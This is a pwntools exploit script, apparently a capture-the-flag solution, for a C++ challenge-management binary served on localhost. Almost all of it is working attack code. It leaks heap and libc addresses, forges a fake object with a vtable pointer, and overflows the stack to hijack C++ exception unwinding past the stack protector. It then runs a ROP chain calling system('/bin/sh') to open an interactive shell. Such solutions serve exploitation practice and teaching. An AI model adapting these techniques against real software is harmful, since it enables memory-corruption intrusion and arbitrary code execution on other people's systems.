#!/usr/bin/env python3

from pwn import *

context.bits = 64
context.arch = 'x86_64'

def mkchall(x, name):
    if isinstance(name, str):
        name = name.encode()
    x.sendlineafter(b">_ ", b"1")
    x.sendlineafter(b"House of ", name)

def pubchall(x, name, points, flag):
    x.sendlineafter(b">_ ", b"2")
    x.sendlineafter(b"What challenge?\n", f"House of {name}".encode())
    x.sendlineafter(b"How many points should this challenge have?\n", str(points).encode())
    x.sendlineafter(b"What should the flag be?\n", flag.encode())

def breakchall(x, name, reason):
    x.sendlineafter(b">_ ", b"2")
    x.sendlineafter(b"What challenge?\n", f"House of {name}".encode())
    x.sendlineafter(b"Terminate input with a . on a single line\n", reason)
    x.sendline(b".")

def solvechall(x, name, flag):
    x.sendlineafter(b">_ ", b"4")
    x.sendlineafter(b"What challenge?\n", f"House of {name}".encode())
    x.sendlineafter(b"Enter flag: ", flag)

def exit(x):
    x.sendlineafter(b">_ ", b"5")

s = remote("localhost", 1337)
e = ELF("./chall")

def heapleak(x, points=42, name="heapleak", invalid_flag="invalid", valid_flag="flag{}"):
    mkchall(x, name)
    pubchall(x, name, points, invalid_flag)
    x.recvuntil(b"Error releasing challenge ")
    leak = int(x.recvuntil(b", try again.", drop=True).decode(), base=16)
    x.sendlineafter(b"How many points should this challenge have?\n", str(points).encode())
    x.sendlineafter(b"What should the flag be?\n", valid_flag.encode())
    return leak

heap = heapleak(s) - 0x13f10
log.success(f"heap @ {hex(heap)}")

x = s
# we craft a fake released_challenge that we use to leak from by setting the name pointer
# to a libc got pointer. We will hijack control flow so that we will enter the ReleasedChall
# constructor with a pointer to this controlled. The AlreadyReleasedException thrown will
# contain the leaked data.
mkchall(s, b"fakecnk" + fit({
    0x00: p64(e.symbols['_ZTV17ReleasedChallenge'] + 0x10), # vtable_for_ReleasedChallenge + 0x10
    0x08: p64(e.symbols['got.__libc_start_main']), #name
    0x10: p64(0x8),
    0x18: p64(0x8),
    0x20: p64(0x00),
    0x28: p64(0x2a),
    0x30: p64(e.symbols['got.__libc_start_main']),
    0x38: p64(0x11),
    0x40: p64(0x11),
    0x48: p64(0x00),
    0x50: p64(0x2a),
}))

# Now we perform the overflow, setting the return address so we unwind
# into CTF::release_chall, after the call to new ReleasedChallenge(stack.challenge),
# which has a crashpad that catches an InvalidInputException (which the SSP exception
# is a subclass of).
# We also set up a stack frame below that, so the next thrown exception will
# put us in the main loop again.
mkchall(x, "trigger")
pubchall(x, "trigger", 69, "flag{}")
solvechall(x, "trigger", flat({
    0x48: p64(e.symbols['_ZN3CTF13release_challEv'] + 1156), # release_chall, after new ReleasedChallenge(stack.challenge)
    0x90: p64(0), # rc, this gets deleted, so we set it to 0 to skip so we don't throw std::bad_alloc
    'taad': p64(heap + 0x14450), # stack.challenge
    'vaad': p64(0),
    'gaae': p64(e.symbols['_ZN3CTF4playEv'] + 0x1d), # this has the crashpad for an NonFatalException, so we continue here
    'uaae': p64(heap + 0x12ec0), # this for CTF::menu()
    'daaf': p64(heap + 0x12ec0), # this for CTF::play()
}))
x.recvuntil(b"Yo you already released ")

libc = ELF("./libc-2.33.so")
libc.address = u64(x.recvuntil(b"\x1b[0m", drop=True).strip().ljust(8, b"\x00")) - libc.symbols['__libc_start_main']
log.success(f"libc @ {hex(libc.address)}")

rop = ROP(e)
log.info(f"/bin/sh @ {hex(next(libc.search(b'/bin/sh')))}")
rop.raw(e.symbols['__libc_csu_init']+99) # pop rdi; ret
rop.raw(next(libc.search(b'/bin/sh')))
rop.call(libc.symbols['system'])
log.info(f"ropchain: \n{rop.dump()}")

# Now the same thing again, but instead of going back into the
# main loop, we run our ROP chain.
solvechall(x, "trigger", flat({
    0x48: p64(e.symbols['_ZN3CTF13release_challEv'] + 1156), # release_chall, after new ReleasedChallenge(stack.challenge)
    0x90: p64(0), # rc, this gets deleted, so we set it to 0 to skip so we don't throw std::bad_alloc
    'taad': p64(heap + 0x14450), # stack.challenge
    'vaad': p64(0),
    'gaae': p64(e.symbols['_ZN3CTF4playEv'] + 0x1d), # this has the crashpad for an NonFatalException, so we continue here
    'uaae': p64(heap + 0x12ec0), # this for CTF::menu()
    'daaf': p64(heap + 0x12ec0), # this for CTF::play()
    'faaf': rop.chain(), # rop chain starts here
}))

ui.pause()
s.sendlineafter(b">_ ", b"5\n")
log.success("spawning shell")
s.interactive()